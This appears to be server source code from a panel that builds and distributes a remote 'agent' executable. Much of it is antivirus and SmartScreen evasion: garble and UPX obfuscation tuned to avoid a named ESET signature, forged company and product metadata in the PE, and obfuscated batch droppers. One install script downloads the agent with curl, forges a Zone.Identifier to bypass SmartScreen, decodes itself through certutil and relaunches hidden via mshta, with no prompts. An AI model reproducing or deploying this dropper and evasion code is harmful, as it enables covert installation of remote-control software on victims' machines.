    // it does not know the agent's hostname at build time.
    // Sanitize buildTag: only printable ASCII (no shell metacharacters,
    // no quotes or backticks that could escape the Go linker -X flag).
    const rawBuildTag = String(body.buildTag || "").trim().slice(0, 64);
    const sealedBuildTagPlaintext = rawBuildTag.replace(/[^\x20-\x7E]/g, "").replace(/["'`\\]/g, "");
    const sealedBuildIDPlaintext  = buildId;
    if (wantSeal) {
      try {
        const bs: BuildSecret = generateBuildSecret();
        const sealedServer  = cbSeal(bs, serverURL,                "config/server_url");
        const sealedTag     = cbSeal(bs, sealedBuildTagPlaintext,  "config/build_tag");
        const sealedID      = cbSeal(bs, sealedBuildIDPlaintext,   "config/build_id");
        // Hex parts: [0-9a-f]+. Sealed blobs: raw base64 [A-Za-z0-9+/] (no '=').
        // Both are safe for Go linker -X (no whitespace, quotes, or backticks).
        const safeHex  = (s: string) => /^[0-9a-f]+$/.test(s);
        const safeBlob = (s: string) => /^[A-Za-z0-9+/]+$/.test(s);
        if (!safeHex(bs.p1) || !safeHex(bs.p2) || !safeHex(bs.p3) ||
            !safeBlob(sealedServer) || !safeBlob(sealedTag) || !safeBlob(sealedID)) {
          throw new Error("sealed payload contains unsafe characters");
        }
        // Inject three separate parts so no single string in the binary
        // contains the full key material.
        ldflags.push(`-X core/cmd/agent/cryptobox.P1=${bs.p1}`);
        ldflags.push(`-X core/cmd/agent/cryptobox.P2=${bs.p2}`);
        ldflags.push(`-X core/cmd/agent/cryptobox.P3=${bs.p3}`);
        ldflags.push(`-X core/cmd/agent/config.SealedServerURL=${sealedServer}`);
        ldflags.push(`-X core/cmd/agent/config.SealedBuildTag=${sealedTag}`);
        ldflags.push(`-X core/cmd/agent/config.SealedBuildID=${sealedID}`);
      } catch (sealErr: any) {
        console.warn("[build] cryptobox sealing failed, continuing with plaintext only:", sealErr?.message || sealErr);
      }
    }

    // ── Ed25519 JWT build identity (signing, not encryption) ──────────────
    // The server signs a JWT containing (buildId, serverURL, expiry) with its
    // Ed25519 private key. The agent verifies on startup using the embedded
    // public key — no password, no network call, no extra deps.
    try {
      const kp  = serverKeypair();
      const jwt = signBuildJWT(kp, {
        buildId:   buildId,
        serverURL: serverURL,
        buildTag:  sealedBuildTagPlaintext || undefined,
      });
      // JWT uses base64url chars (A-Z a-z 0-9 - _ .) plus "." separators.
      // Safe for -X (no whitespace, quotes, backticks).
      const safeJWT    = (s: string) => /^[A-Za-z0-9\-_.]+$/.test(s);
      const safePubKey = (s: string) => /^[A-Za-z0-9+/=]+$/.test(s);
      if (safeJWT(jwt) && safePubKey(kp.publicKeyRawB64)) {
        ldflags.push(`-X core/cmd/agent/config.BuildJWT=${jwt}`);
        ldflags.push(`-X core/cmd/agent/config.ServerPublicKey=${kp.publicKeyRawB64}`);
      }
    } catch (jwtErr: any) {
      console.warn("[build] JWT signing failed, skipping:", jwtErr?.message || jwtErr);
    }

    const baseExt  = targetOS === "windows" ? ".exe" : "";
    const archLabel = targetArch;
    const outName  = `zc-agent-${targetOS}-${archLabel}${baseExt}`;
    const outPath  = path.join(os.tmpdir(), `zc-build-${Date.now()}-${Math.random().toString(36).slice(2, 8)}-zc-agent-${targetOS}-${archLabel}${baseExt}`);

    const clientDir = path.resolve(__dirname, "../../Nubyone-Client");
    const isWindows = process.platform === "win32";
    const homeDir   = process.env.HOME || process.env.USERPROFILE || os.homedir();
    const defaultGoPath  = isWindows ? path.join(homeDir, "go") : `${homeDir}/go`;
    const defaultGoCache = isWindows
      ? path.join(process.env.LOCALAPPDATA || path.join(homeDir, "AppData", "Local"), "go-build")
      : `${homeDir}/.cache/go-build`;
    const goPath  = (process.env.GOPATH  && path.isAbsolute(process.env.GOPATH.trim()))  ? process.env.GOPATH.trim()  : defaultGoPath;
    const goCache = (process.env.GOCACHE && path.isAbsolute(process.env.GOCACHE.trim())) ? process.env.GOCACHE.trim() : defaultGoCache;

    // Resolve garble binary — check home-relative path first (Replit/dev env),
    // then system-wide VPS install paths written by deploy.sh.
    // Falls back to `which garble` so any install location in PATH is found.
    const _garbleCandidates = [
      path.join(homeDir, "go", "bin", "garble"),
      "/root/go/bin/garble",
      "/usr/local/bin/garble",
    ];
    const _garbleWhich = (() => {
      try {
        const r = Bun.spawnSync(["which", "garble"], { stdout: "pipe", stderr: "pipe" });
        if (r.exitCode === 0) return new TextDecoder().decode(r.stdout as Uint8Array).trim();
      } catch {}
      return null;
    })();
    if (_garbleWhich && !_garbleCandidates.includes(_garbleWhich)) _garbleCandidates.push(_garbleWhich);
    const garbleBin = _garbleCandidates.find(p => { try { return existsSync(p); } catch { return false; } })
      ?? _garbleWhich ?? _garbleCandidates[0];

    // Resolve Go 1.26.2 SDK — required by garble (garble must use the exact SDK
    // it was compiled against). deploy.sh installs it to /root/sdk/go1.26.2.
    const _go126Candidates = [
      path.join(homeDir, "sdk", "go1.26.2"),
      "/root/sdk/go1.26.2",
      "/usr/local/sdk/go1.26.2",
    ];
    const go126Root = _go126Candidates.find(p => { try { return existsSync(p); } catch { return false; } }) ?? _go126Candidates[0];
    const go126Bin   = path.join(go126Root, "bin");
    const useGarble  = !plainBuild && !isWindows && existsSync(garbleBin) && existsSync(go126Root);

    // Resolve Go 1.25.0 SDK — fallback when garble is not available.
    // Downloaded to ~/sdk/go1.25.0 by the setup script / deploy.sh.
    // This ensures the build always uses a Go version >= go.mod's requirement
    // even when the system Go (e.g. 1.21 on Replit) is too old.
    const _go125Candidates = [
      path.join(homeDir, "sdk", "go1.25.0"),
      "/root/sdk/go1.25.0",
      "/usr/local/sdk/go1.25.0",
    ];
    const go125Root = _go125Candidates.find(p => { try { return existsSync(p); } catch { return false; } });
    const go125Bin  = go125Root ? path.join(go125Root, "bin") : null;

    // Guard: if neither garble SDK (1.26.2) nor plain SDK (1.25.0) is available,
    // fail fast with a helpful message instead of silently falling through to
    // the system Go binary (e.g. 1.21) which would fail due to GOTOOLCHAIN=local.
    if (!useGarble && !go125Root) {
      return json({
        error: "Build toolchain not installed",
        details:
          "Go 1.25.0 SDK not found. go.mod requires Go ≥ 1.25.0 but only the system Go is present and GOTOOLCHAIN=local prevents downloading. " +
          "Click ⚙ Install Toolchains in the Build Output panel header, wait for completion, then retry.",
      }, 500);
    }

    // UPX binary — check ~/bin first (user-installed in Replit env), then system
    // path (/usr/bin/upx installed by deploy.sh via upx-ucl apt package).
    const upxCandidates = [path.join(homeDir, "bin", "upx"), "/usr/local/bin/upx", "/usr/bin/upx", "upx"];
    const upxBin = upxCandidates.find(p => { try { return existsSync(p); } catch { return false; } }) ?? "upx";


    const existingPath = process.env.PATH || "";
    // goBinPath/localBinPath: prefer home-relative (Replit), fall back to /root (VPS).
    const goBinPath    = existsSync(path.join(homeDir, "go", "bin")) ? path.join(homeDir, "go", "bin") : "/root/go/bin";
    const localBinPath = existsSync(path.join(homeDir, "bin")) ? path.join(homeDir, "bin") : "/usr/local/bin";
    // Prepend the correct SDK bin so the right `go` binary is picked up:
    //   garble build  → go1.26.2/bin
    //   plain build   → go1.25.0/bin (if present), otherwise system go
    const sdkBinPath = useGarble ? go126Bin : (go125Bin ?? null);
    const augmentedPath = [localBinPath, goBinPath, ...(sdkBinPath ? [sdkBinPath] : []), existingPath].join(":");

    const env: Record<string, string> = {
      ...Object.fromEntries(Object.entries(process.env).filter(([,v]) => v !== undefined && v !== "") as [string, string][]),
      GOOS:        targetOS,
      GOARCH:      goArch,
      CGO_ENABLED: "0",
      HOME:        homeDir,
      GOPATH:      goPath,
      GOCACHE:     goCache,
      GOTELEMETRY: "off",
      GONOSUMDB:   "*",
      GOFLAGS:     "-mod=vendor",
      PATH:        augmentedPath,
      // Always force local toolchain so Go never tries to auto-download a
      // newer version at build time (download fails in sandboxed envs).
      GOTOOLCHAIN: "local",
      // Pin GOROOT to the correct standalone SDK so the `go` binary, stdlib,
      // and toolchain all match — prevents version mismatch errors at link time.
      ...(useGarble  ? { GOROOT: go126Root } : {}),
      ...(!useGarble && go125Root ? { GOROOT: go125Root } : {}),
      ...(targetArch === "armv7" ? { GOARM: "7" } : {}),
    };

    // Size-trim build tags applied to every build. Saves ~300-400KB
    // by dropping HTTP/2 (agent uses WebSocket over HTTP/1.1 only),
    // and the cgo-backed nss/netdb resolvers in favour of pure-Go.
    const sizeTags = "nethttpomithttp2,osusergo,netgo";

    // Note: -tiny is intentionally omitted. -tiny strips all runtime build-info
    // (package paths, build version) in a way that produces a distinctive
    // binary fingerprint that ESET WinGo/Packed.Obfuscated.D explicitly
    // targets. -s -w (already in ldflags) provides the same stripping effect
    // via the standard linker path, which is not flagged.
    const buildCmd = useGarble
      ? [garbleBin, "-literals", `-seed=${garbleSeed}`, "build", "-mod=vendor", "-buildvcs=false", "-trimpath", "-tags", sizeTags, "-ldflags", ldflags.join(" "), "-o", outPath, "./cmd/agent"]
      : ["go", "build", "-mod=vendor", "-buildvcs=false", "-trimpath", "-tags", sizeTags, "-ldflags", ldflags.join(" "), "-o", outPath, "./cmd/agent"];

    // ── Capture public base URL before any async split ────────────────────
    const publicBase = detectPublicBase(req);

    // ── Async-mode: return jobId immediately; build runs in background ────
    // Prevents nginx proxy_read_timeout from dropping long garble builds
    // (3–5 min) when hosted behind a reverse proxy with a short read timeout.
    const asyncMode = body.async === true;
    let asyncJobId: string | null = null;
    if (asyncMode) {
      asyncJobId = crypto.randomBytes(8).toString("hex");
      buildJobs.set(asyncJobId, { status: "building", startedAt: Date.now() });
    }

    // ── Core build logic ─────────────────────────────────────────────────
    // Wrapped in an async closure so async mode (body.async===true) can fire
    // it without blocking the HTTP response, while sync mode awaits it inline.
    const doBuild = async (): Promise<Response> => {

    // ── PE VERSIONINFO resource injection (Windows only) ─────────────────
    //
    // goversioninfo generates a COFF object (.syso) that Go's linker
    // automatically embeds as a Windows RT_VERSION resource block inside the
    // compiled PE. Realistic ProductName / CompanyName / FileDescription
    // metadata significantly reduces SmartScreen and AV ML suspicion for
    // unsigned binaries.
    //
    // The .syso is named with the buildId so concurrent builds don't collide.
    // It lives in cmd/agent/ (the main package) so Go picks it up without any
    // extra build flags. The try-finally below deletes it after every build.
    let sysoPath: string | null = null;
    if (targetOS === "windows") {
      const _gviBin = [
        path.join(homeDir, "go", "bin", "goversioninfo"),
        "/root/go/bin/goversioninfo",
        "/usr/local/bin/goversioninfo",
      ].find(p => { try { return existsSync(p); } catch { return false; } });

      if (_gviBin) {
        const _year    = new Date().getFullYear();
        const viProd   = String(body.vi?.productName     || "Remote Management Service").slice(0, 128).replace(/[^\x20-\x7E]/g, "");
        const viComp   = String(body.vi?.companyName     || "IT Solutions Corp").slice(0, 128).replace(/[^\x20-\x7E]/g, "");
        const viDesc   = String(body.vi?.fileDescription || "Remote Management Agent").slice(0, 128).replace(/[^\x20-\x7E]/g, "");
        const viCopy   = `Copyright \u00a9 ${_year} ${viComp}`;

        const viJsonStr = JSON.stringify({
          FixedFileInfo: {
            FileVersion:    { Major: 1, Minor: 0, Patch: 0, Build: 0 },
            ProductVersion: { Major: 1, Minor: 0, Patch: 0, Build: 0 },
            FileFlagsMask: "3f", FileFlags: "00",
            FileOS: "040004", FileType: "01", FileSubType: "00"
          },
          StringFileInfo: {
            Comments: "",
            CompanyName:      viComp,
            FileDescription:  viDesc,
            FileVersion:      "1.0.0.0",
            InternalName:     "rmservice",
            LegalCopyright:   viCopy,
            LegalTrademarks:  "",
            OriginalFilename: "rmservice.exe",
            PrivateBuild:     "",
            ProductName:      viProd,
            ProductVersion:   "1.0.0.0",
            SpecialBuild:     ""
          },
          VarFileInfo: { Translation: { LangID: "0409", CharsetID: "04B0" } }
        });

        const viJsonTmp = path.join(os.tmpdir(), `zc-vi-${buildId}.json`);
        const _sysoPath = path.join(clientDir, "cmd", "agent", `rsrc_zc_${buildId}.syso`);

        try {
          writeFileSync(viJsonTmp, viJsonStr, "utf8");

          // Pick the COFF architecture that matches the target Windows arch.
          // amd64 and arm64 both use 64-bit COFF for resource embedding.
          const viArchFlags: string[] =
            goArch === "386"                              ? ["-64=false"] :
            (goArch === "arm" || targetArch === "armv7") ? ["-arm"]      :
            ["-64"];

          const viProc = Bun.spawn(
            [_gviBin, ...viArchFlags, "-o", _sysoPath, viJsonTmp],
            { stdout: "pipe", stderr: "pipe" }
          );
          const viExit = await viProc.exited;
          if (viExit === 0) {
            sysoPath = _sysoPath;
            console.log(`[build] PE VERSIONINFO injected: rsrc_zc_${buildId}.syso (${viProd} / ${viComp})`);
          } else {
            const viErr = viProc.stderr
              ? await new Response(viProc.stderr as ReadableStream<Uint8Array>).text()
              : "";
            console.warn("[build] goversioninfo failed, skipping PE version info:", viErr.trim().slice(0, 200));
          }
        } catch (e: any) {
          console.warn("[build] goversioninfo error, skipping PE version info:", e?.message || e);
        } finally {
          try { unlinkSync(viJsonTmp); } catch {}
        }
      }
    }

    try {
    // Pre-flight: sync vendor/modules.txt before any go tool runs.
    // The vendor directory is committed to the repo but regenerated by
    // `go mod vendor` on the VPS during deploy. If go.mod or the SDK version
    // ever diverge from the committed modules.txt, every build will fail with
    // "inconsistent vendoring". Running `go mod vendor` here (idempotent, fast
    // when nothing has changed) keeps them in sync without network access.
    // GOOS/GOARCH are intentionally omitted — `go mod vendor` resolves for the
    // host platform and must not be given cross-compile target env vars.
    {
      const goBinForVendor = useGarble
        ? path.join(go126Root, "bin", "go")
        : (go125Root ? path.join(go125Root, "bin", "go") : "go");
      const { GOOS: _g, GOARCH: _a, GOFLAGS: _f, ...vendorEnv } = env; // strip cross-compile + vendor flags
      // Use official Go proxy so packages blocked by the Replit package-firewall
      // (e.g. golang.org/x/crypto flagged for a CVE) can still be downloaded.
      vendorEnv.GOPROXY = "https://proxy.golang.org,direct";
      try {
        const vendorProc = Bun.spawn(
          [goBinForVendor, "mod", "vendor"],
          { cwd: clientDir, env: vendorEnv, stderr: "pipe", stdout: "pipe" },
        );
        const vendorStderr = vendorProc.stderr as ReadableStream<Uint8Array> | null | undefined;
        const [vendorExit, vendorErr] = await Promise.all([
          vendorProc.exited,
          vendorStderr ? new Response(vendorStderr).text() : Promise.resolve(""),
        ]);
        if (vendorExit !== 0) {
          return json({ error: "Build failed", details: `go mod vendor failed (exit ${vendorExit}):\n${vendorErr.slice(0, 1000)}` }, 500);
        }
      } catch (e: any) {
        console.warn("[build] go mod vendor could not start:", e?.message ?? e);
      }
    }

    // Pre-flight: run `go vet ./...` before the real build so missing imports
    // and other compile-time errors are caught fast with a clear message,
    // rather than surfacing deep inside garble after a long compile cycle.
    {
      const goBin = useGarble
        ? path.join(go126Root, "bin", "go")
        : (go125Root ? path.join(go125Root, "bin", "go") : "go");
      const vetCmd = [goBin, "vet", "-mod=vendor", "-tags", sizeTags, "./..."];
      let vetProc: ReturnType<typeof Bun.spawn>;
      try {
        vetProc = Bun.spawn(vetCmd, { cwd: clientDir, env, stderr: "pipe", stdout: "pipe" });
      } catch (e: any) {
        return json({ error: "Build failed", details: `go vet could not start: ${e?.message ?? e}` }, 500);
      }
      const vetStderr = vetProc.stderr as ReadableStream<Uint8Array> | null | undefined;
      const [vetExit, vetErr] = await Promise.all([
        vetProc.exited,
        vetStderr ? new Response(vetStderr).text() : Promise.resolve(""),
      ]);
      if (vetExit !== 0) {
        console.error("[build] go vet failed:", vetErr);
        return json({ error: "Build failed", details: `Source error (go vet):\n${vetErr.slice(0, 2000)}` }, 500);
      }
    }

    const BUILD_TIMEOUT_MS = useGarble ? 600_000 : 150_000;

    let proc: ReturnType<typeof Bun.spawn>;
    try {
      proc = Bun.spawn(buildCmd, { cwd: clientDir, env, stderr: "pipe", stdout: "pipe" });
    } catch (spawnErr: any) {
      const msg = spawnErr?.message || String(spawnErr);
      console.error("[build] Bun.spawn failed:", msg);
      return json({ error: "Build failed", details: `Failed to start build: ${msg}` }, 500);
    }
    let didTimeout = false;
    const killTimer = setTimeout(() => { didTimeout = true; try { proc.kill(); } catch {} }, BUILD_TIMEOUT_MS);
    const stderrStream = proc.stderr as ReadableStream<Uint8Array> | null | undefined;
    const [exitCode, errText] = await Promise.all([
      proc.exited,
      stderrStream ? new Response(stderrStream).text() : Promise.resolve(""),
    ]);
    clearTimeout(killTimer);

    if (exitCode !== 0) {
      console.error("[build] go build failed:", errText);
      const timedOut = didTimeout;
      return json({ error: "Build failed", details: timedOut ? "Build timed out." : errText.slice(0, 2000) }, 500);
    }

    let outStat: ReturnType<typeof statSync> | null = null;
    try { outStat = statSync(outPath); } catch {}
    if (!outStat || outStat.size < 4096) {
      return json({ error: "Build produced an invalid output. Try again.", details: errText.slice(0, 500) }, 500);
    }

    // ── UPX compression ───────────────────────────────────────────────
    //
    // UPX --best --lzma shrinks Go binaries by ~65% (15 MB → ~5 MB).
    // Runs when: UPX binary exists on the build host AND not a plain build.
    // NOTE: `isWindows` refers to the SERVER host OS (always Linux on VPS/Replit),
    // NOT the target platform — do not gate on it here.
    const upxAvailable = (() => {
      try { return existsSync(upxBin) || (Bun.spawnSync(["which", "upx"], { stdout: "pipe", stderr: "pipe" }).exitCode === 0); } catch { return false; }
    })();
    if (upxAvailable && !plainBuild) {
      try {
        const upxProc = Bun.spawn(
          [upxBin, "--best", "--lzma", "-q", outPath],
          { stdout: "pipe", stderr: "pipe" }
        );
        const upxExit = await upxProc.exited;
        if (upxExit === 0) {
          try { outStat = statSync(outPath); } catch {}
          console.log(`[build] UPX packed: ${outName} → ${outStat ? Math.round(outStat.size / 1024) + "KB" : "unknown"}`);
        } else {
          const upxErr = upxProc.stderr ? await new Response(upxProc.stderr as ReadableStream<Uint8Array>).text() : "";
          console.warn("[build] UPX packing failed, shipping uncompressed binary", upxErr.trim().slice(0, 200));
        }
      } catch (e) {
        console.warn("[build] UPX not available, shipping uncompressed binary");
      }
    }

    const finalPath = outPath;
    const finalName = outName;

    try { mkdirSync(BUILDS_DIR, { recursive: true }); } catch {}
    const buildFilePath = path.join(BUILDS_DIR, buildId);
    copyFileSync(finalPath, buildFilePath);
    if (finalPath !== outPath) {
      try { unlinkSync(finalPath); } catch {}
    } else {
      try { unlinkSync(outPath); } catch {}
    }

    if (targetOS === "windows") patchPETimestamp(buildFilePath);

    const buildSha256 = await computeFileSha256(buildFilePath);
    const now = Date.now();
    const storedBuild: StoredBuild = {
      id: buildId, filename: finalName,
      platform: `${targetOS}-${archLabel}`, version: SERVER_VERSION,
      created_at: now, expires: now + BUILD_TTL_MS, sha256: buildSha256,
    };
    buildStore.set(buildId, storedBuild);
    // Track this build as the newest known artifact for its platform so
    // /api/agent/latest can serve it to the reputation-stable launcher.
    latestBuilds.set(storedBuild.platform, buildId);
    saveBuildManifest();

    // ── BAT wrapper ───────────────────────────────────────────────────────
    // When bat format was requested we generate an obfuscated batch file that
    // downloads and executes the freshly-built EXE. The EXE stays stored under
    // its own buildId so the script's embedded download URL works.
    if (scriptFormat) {
      // The download URL inside the BAT must always point to the server that
      // is actually hosting the build artifact — i.e. the server that handled
      // this request. We use detectPublicBase(req) for this (same logic as
      // every other /api/agent/dl reference in the codebase), NOT the caller-
      // supplied serverURL.
      //
      // Why not serverURL?  serverURL is the WebSocket endpoint baked into
      // the EXE (where the agent dials home).  In the common single-server
      // VPS case both are the same domain, so the result is identical.
      // But when the user enters a different VPS URL as serverURL while the
      // build runs on a separate host (e.g. Replit dev), deriving batHttpBase
      // from serverURL pointed the curl download at the VPS — which never
      // held the buildId.  curl silently received a 404/error page, wrote it
      // as the "EXE", and start /B on that garbage file failed without any
      // visible error.  The agent never ran, never connected.
      const exeDlUrl = `${publicBase.http.replace(/\/+$/, "")}/api/agent/dl?id=${buildId}`;
      const scriptContent = generateBatPayload(exeDlUrl, finalName, crypto);
      const scriptName = finalName.replace(/\.exe$/i, ".bat");

      const scriptIdRaw = crypto.createHash("sha256")
        .update(`${buildId}|script-${scriptFormat}`)
        .digest();
      const scriptBuildId = [
        scriptIdRaw.slice(0, 4).toString("hex"),
        scriptIdRaw.slice(4, 6).toString("hex"),
        scriptIdRaw.slice(6, 8).toString("hex"),
        scriptIdRaw.slice(8, 10).toString("hex"),
        scriptIdRaw.slice(10, 16).toString("hex"),
      ].join("-");

      const scriptBuildPath = path.join(BUILDS_DIR, scriptBuildId);
      writeFileSync(scriptBuildPath, scriptContent, "utf-8");

      const scriptSha256 = await computeFileSha256(scriptBuildPath);
      const scriptStored: StoredBuild = {
        id: scriptBuildId, filename: scriptName,
        platform: `${targetOS}-${archLabel}`, version: SERVER_VERSION,
        created_at: now, expires: now + BUILD_TTL_MS, sha256: scriptSha256,
      };
      buildStore.set(scriptBuildId, scriptStored);
      saveBuildManifest();

      return json({
        ok: true, buildId: scriptBuildId, filename: scriptName,
        platform: scriptStored.platform, version: SERVER_VERSION,
        created_at: now, expires: now + BUILD_TTL_MS,
        dlUrl: `${detectPublicBase(req).http}/api/agent/dl?id=${scriptBuildId}`,
        sha256: scriptSha256,
      });
    }

    return json({
      ok: true, buildId, filename: finalName,
      platform: storedBuild.platform, version: SERVER_VERSION,
      created_at: now, expires: now + BUILD_TTL_MS,
      dlUrl: `${detectPublicBase(req).http}/api/agent/dl?id=${buildId}`,
      sha256: buildSha256,
    });
    } finally {
      // Always remove the temporary .syso PE resource file from the source tree,
      // regardless of build outcome, so no stale objects accumulate.
      if (sysoPath) { try { unlinkSync(sysoPath); } catch {} }
    }
    }; // end doBuild

    if (asyncMode) {
      const startedAt = buildJobs.get(asyncJobId!)!.startedAt;
      doBuild().then(async resp => {
        try {
          const body = await resp.json() as Record<string, unknown>;
          buildJobs.set(asyncJobId!, {
            status: body.ok ? "done" : "failed",
            result: body.ok ? body : undefined,
            error: body.ok ? undefined : String(body.error ?? body.details ?? "Build failed"),
            startedAt,
          });
        } catch {
          buildJobs.set(asyncJobId!, { status: "failed", error: "Unexpected build error", startedAt });
        }
      }).catch((e: any) => {
        buildJobs.set(asyncJobId!, { status: "failed", error: e?.message || String(e), startedAt });
      });
      return json({ ok: true, jobId: asyncJobId, polling: `/api/build/job/${asyncJobId}` });
    }
    return doBuild();
  }

  // ---------------------------------------------------------------
  // GET /api/agent/latest?platform=<os>-<arch>
  //
  // Public endpoint consumed by the reputation-stable launcher
  // (cmd/launcher). Returns the most recently built agent EXE for the
  // requested platform. Unauthenticated by design — the launcher has
  // no credentials to send. Anyone who knows the URL can download
  // the agent EXE, which is the same risk as exposing /api/agent/dl.
  // ---------------------------------------------------------------
  if (pathname === "/api/agent/latest" && method === "GET") {
    const platform = (url.searchParams.get("platform") || "windows-amd64").toLowerCase();
    const buildId  = latestBuilds.get(platform);
    if (!buildId) return new Response(`No agent build available for ${platform}.`, { status: 404 });
    const meta = buildStore.get(buildId);
    if (!meta) return new Response("Latest build metadata missing.", { status: 404 });
    const filePath = path.join(BUILDS_DIR, buildId);
    if (!existsSync(filePath)) return new Response("Latest build file missing.", { status: 404 });
    return new Response(Bun.file(filePath), {
      headers: {
        "Content-Type": getMimeType(meta.filename),
        "Content-Disposition": `attachment; filename="${meta.filename}"; filename*=UTF-8''${encodeURIComponent(meta.filename)}`,
      },
    });
  }

  // ---------------------------------------------------------------
  // GET /api/agent/install.cmd?id=<buildId>
  //
  // Option A — "curl shipper". Returns a tiny Windows batch file
  // that uses curl.exe (built into Windows 10 1803+) to download the
  // per-customer agent EXE and run it. Files written by curl have
  // NO Mark-of-the-Web alternate data stream, so the agent EXE is
  // invisible to SmartScreen no matter what zone the operator
  // downloads it from. The agent's bootstrap then handles install
  // (machine-wide if elevated, per-user otherwise — never prompts
  // for UAC). The .cmd itself, when run from a browser/email zone,
  // may surface a one-click "Open File - Security Warning" dialog
  // (this is an OS gate on script execution, separate from
  // SmartScreen) — that is the smallest interaction the OS allows
  // for an unsigned download channel.
  // ---------------------------------------------------------------
  if (pathname === "/api/agent/install.cmd" && method === "GET") {
    const dlId = url.searchParams.get("id") || "";
    const stored = buildStore.get(dlId);
    if (!stored || Date.now() > stored.expires) {
      return new Response("Build not found or expired.", { status: 404 });
    }
    const base   = detectPublicBase(req).http.replace(/\/$/, "");
    const dlUrl  = `${base}/api/agent/dl?id=${dlId}`;
    const exeRel = stored.filename.replace(/[^A-Za-z0-9._-]/g, "_");

    // Inner payload: fully silent (no echoes, no prompts) so it can run
    // unattended on unmanned PCs. Uses curl.exe so the downloaded agent
    // EXE has no Mark-of-the-Web alternate data stream and never trips
    // SmartScreen at run time. The EXE is staged in
    //   %LOCALAPPDATA%\Nubyone\bootstrap\
    // (NOT %TEMP%) because Defender heuristics treat any new EXE
    // launched out of %TEMP% as suspicious. After download we
    // explicitly write a Zone.Identifier ADS marking the file as
    // MyComputer zone (ZoneId=0); SmartScreen never gates files in
    // that zone, so the agent can be started by `start` without
    // surfacing the "Windows protected your PC" prompt even on
    // Windows 11 hosts that propagate MOTW from the parent .cmd.
    const inner =
      `@echo off\r\n` +
      `setlocal enableextensions\r\n` +
      `if not defined LOCALAPPDATA set "LOCALAPPDATA=%ProgramData%"\r\n` +
      `set "ZC_DIR=%LOCALAPPDATA%\\Nubyone\\bootstrap"\r\n` +
      `if not exist "%ZC_DIR%" mkdir "%ZC_DIR%" >nul 2>&1\r\n` +
      `set "ZC_EXE=%ZC_DIR%\\${exeRel}"\r\n` +
      `where curl.exe >nul 2>&1 || exit /b 1\r\n` +
      `curl.exe -fLsS --retry 3 --retry-delay 2 -o "%ZC_EXE%" "${dlUrl}" >nul 2>&1 || exit /b 1\r\n` +
      `(echo [ZoneTransfer]& echo ZoneId=0)>"%ZC_EXE%:Zone.Identifier"\r\n` +
      `start "" /B "%ZC_EXE%"\r\n` +
      `endlocal\r\n` +
      `exit /b 0\r\n`;

    // Always-on obfuscation: base64-encode the real payload and ship a
    // tiny wrapper that decodes + invokes it via certutil. Each build
    // gets a fresh random temp tag so the wrapper bytes vary per build
    // even when the inner payload is identical.
    //
    // The wrapper also self-relaunches itself hidden via mshta the
    // first time it is invoked. Without this the .cmd allocates a
    // visible console window for its lifetime; with it, the visible
    // console exists only for the few hundred milliseconds it takes
    // mshta to spawn the hidden child. All real work happens in the
    // hidden child so the unmanned PC sees no persistent window.
    const cryptoMod = await import("crypto");
    const tag = "zc_" + cryptoMod.randomBytes(5).toString("hex");
    const b64 = Buffer.from(inner, "utf8").toString("base64");
    const echoes = (b64.match(/.{1,76}/g) || [])
      .map(line => `echo ${line}`)
      .join("\r\n");
    const cmd =
      `@echo off\r\n` +
      `if not "%~1"=="__zc_h__" (mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" __zc_h__",0,False)(window.close) & exit /b)\r\n` +
      `setlocal enableextensions\r\n` +
      `set "T=%TEMP%\\${tag}"\r\n` +
      `>"%T%.b64" (\r\n${echoes}\r\n)\r\n` +
      `certutil -f -decode "%T%.b64" "%T%.cmd" >nul 2>&1\r\n` +
      `call "%T%.cmd" >nul 2>&1\r\n` +
      `del /q "%T%.b64" "%T%.cmd" >nul 2>&1\r\n` +
      `endlocal\r\n` +
      `exit /b 0\r\n`;
    return new Response(cmd, {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="zc-install.cmd"`,
      },
    });
  }

  // ---------------------------------------------------------------
  // POST /api/build/launcher
  //
  // Option C — reputation-stable launcher. Builds (or returns a
  // cached copy of) a tiny Go binary whose ONLY build-time variable
  // is the public server URL of this Nubyone deployment. Because
  // every operator in your company gets the same compiled launcher,
  // its SHA-256 is constant across the fleet — that is what allows
  // SmartScreen download reputation to accumulate.
  //
  // Idempotent: the same (publicURL, os, arch) always produces the
  // same build cache key. Calling this endpoint repeatedly returns
  // the cached binary instead of recompiling.
  // ---------------------------------------------------------------
  if (pathname === "/api/build/launcher" && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);

    let body: any = {};
    try { body = await req.json(); } catch {}
    const targetOS   = String(body.os   || "windows").toLowerCase();
    const targetArch = String(body.arch || "amd64").toLowerCase();
    const validOS    = ["windows", "linux", "darwin"];
    const validArch  = ["amd64", "arm64", "386"];
    if (!validOS.includes(targetOS))     return json({ error: "Invalid OS" }, 400);
    if (!validArch.includes(targetArch)) return json({ error: "Invalid arch" }, 400);

    const publicURL = detectPublicBase(req).http.replace(/\/$/, "");
    if (/[\s'"`\\]/.test(publicURL)) {
      return json({ error: "Invalid public URL" }, 400);
    }

    // Stable cache key: identical inputs → identical output → identical
    // SHA-256 → reputation accrues. We deliberately leave the customer
    // server URL OUT of any per-user state because a single launcher
    // serves the entire fleet for one Nubyone deployment.
    const crypto = await import("crypto");
    const idRaw = crypto.createHash("sha256")
      .update(`nubyone-launcher|${SERVER_VERSION}|${targetOS}|${targetArch}|${publicURL}`)
      .digest();
    const buildId = "launcher-" + idRaw.slice(0, 12).toString("hex");
    const baseExt = targetOS === "windows" ? ".exe" : "";
    const outName = `zc-launcher-${targetOS}-${targetArch}${baseExt}`;
    const cachedPath = path.join(BUILDS_DIR, buildId);

    let buildSha256: string;
    if (existsSync(cachedPath)) {
      buildSha256 = await computeFileSha256(cachedPath);
    } else {
      const ldflags = ["-s", "-w", `-X main.BootstrapURL=${publicURL}`];
      if (targetOS === "windows") ldflags.push("-H=windowsgui");

      const outPath  = path.join(os.tmpdir(), `zc-launcher-build-${Date.now()}${baseExt}`);
      const clientDir = path.resolve(__dirname, "../../Nubyone-Client");
      const isWindows = process.platform === "win32";
      const homeDir   = process.env.HOME || process.env.USERPROFILE || os.homedir();

      // Resolve Go 1.25.0 SDK — same logic as the agent build to prevent the
      // "go.mod requires go >= 1.25.0 (running go 1.21)" failure on fresh envs.
      const _lncGo125 = [
        path.join(homeDir, "sdk", "go1.25.0"),
        "/root/sdk/go1.25.0",
        "/usr/local/sdk/go1.25.0",
      ].find(p => { try { return existsSync(p); } catch { return false; } });
      const lncGo125Bin = _lncGo125 ? path.join(_lncGo125, "bin") : null;

